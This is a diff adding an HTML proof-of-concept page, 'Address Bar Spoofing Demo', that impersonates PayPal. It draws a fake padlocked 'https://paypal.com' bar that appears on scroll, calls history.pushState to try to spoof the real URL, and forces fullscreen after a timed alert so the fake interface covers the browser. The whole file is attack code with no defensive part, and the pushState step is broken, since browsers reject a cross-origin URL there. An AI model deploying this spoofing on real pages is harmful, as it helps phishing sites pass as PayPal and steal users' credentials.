@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Address Bar Demo</title>
+    <style>
+        body { margin: 0; font-family: Arial, sans-serif; text-align: center; }
+        .fake-bar {
+            display: none; /* Initially hidden */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 30px;
+            background: white;
+            color: black;
+            font-size: 14px;
+            font-weight: bold;
+            padding: 5px;
+            border-bottom: 2px solid gray;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <div id="fakeBar" class="fake-bar">🔒 https://paypal.com</div>
+
+    <h1>🚨 Address Bar Spoofing Demo 🚨</h1>
+    <p>Scroll down to see a fake address bar appear!</p>
+
+    <script>
+        // Method 1: Change Address Bar URL (History API)
+        history.pushState({}, "", "https://paypal.com"); // Spoofed URL
+
+        // Method 2: Fake Address Bar for Mobile Browsers
+        window.onscroll = function() {
+            if (window.scrollY > 50) {
+                document.getElementById("fakeBar").style.display = "block";
+            } else {
+                document.getElementById("fakeBar").style.display = "none";
+            }
+        };
+
+        // Method 3: Attempt Fullscreen Fake UI (Might be blocked by some browsers)
+        function goFullscreen() {
+            document.documentElement.requestFullscreen();
+        }
+
+        setTimeout(() => {
+            alert("Click OK to continue (triggers fullscreen mode)");
+            goFullscreen();
+        }, 3000);
+    </script>
+</body>
+</html>
